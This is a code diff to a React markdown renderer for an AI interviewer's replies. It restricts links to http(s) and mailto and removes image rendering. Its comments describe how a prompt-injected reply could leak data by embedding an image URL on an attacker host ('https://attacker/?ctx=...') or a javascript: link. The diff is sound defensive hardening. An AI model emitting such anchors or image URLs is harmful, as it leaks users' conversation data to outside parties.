@@ -184,16 +184,30 @@ function AgentMarkdown({ content }: { content: string }) {
           <strong className="font-semibold text-gray-900">{children}</strong>
         ),
         em: ({ children }) => <em className="italic">{children}</em>,
-        a: ({ href, children }) => (
-          <a
-            href={href}
-            target="_blank"
-            rel="noopener noreferrer"
-            className="text-[#0F2747] underline underline-offset-2 hover:text-[#1D4ED8] transition-colors"
-          >
-            {children}
-          </a>
-        ),
+        a: ({ href, children }) => {
+          // Only render http(s) / mailto links. Drops javascript:, data:,
+          // and any other scheme that could exfiltrate or execute. Defends
+          // against prompt-injected AI replies emitting malicious anchors.
+          const safe =
+            typeof href === "string" &&
+            /^(https?:|mailto:)/i.test(href.trim());
+          if (!safe) return <>{children}</>;
+          return (
+            <a
+              href={href}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="text-[#0F2747] underline underline-offset-2 hover:text-[#1D4ED8] transition-colors"
+            >
+              {children}
+            </a>
+          );
+        },
+        // Images are stripped: the AI is a text interviewer and has no
+        // legitimate reason to send images. Without this, a prompt-injected
+        // reply could embed ![](https://attacker/?ctx=...) and silently
+        // exfiltrate data via the browser's automatic image fetch.
+        img: () => null,
         code: ({ children }) => (
           <code className="rounded bg-gray-100 px-1.5 py-0.5 font-mono text-[0.85em] text-gray-800">
             {children}
